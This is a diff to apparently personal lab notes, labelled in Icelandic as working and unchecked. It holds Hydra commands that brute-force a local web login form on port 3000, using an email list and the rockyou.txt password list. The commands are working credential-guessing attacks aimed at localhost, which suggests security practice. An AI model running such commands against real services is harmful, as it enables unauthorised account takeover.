@@ -1,3 +1,7 @@
+Virkar:
+hydra -L emails.txt -P rockyou.txt -s 3000 localhost http-post-form "/login:email=^USER^&password=^PASS^:Invalid email or password"
+
+Ekki búinn að tékka:
 hydra -v -I -L emails.txt -P rockyou.txt -s 3000 127.0.0.1 http-post-form "/login:email=^USER^&password=^PASS^:Invalid email or password" 
 
 hydra -v -I -L emails.txt -P rockyou.txt -s 3000 localhost http-post-form "/login:email=^USER^&password=^PASS^:Invalid email or password" 
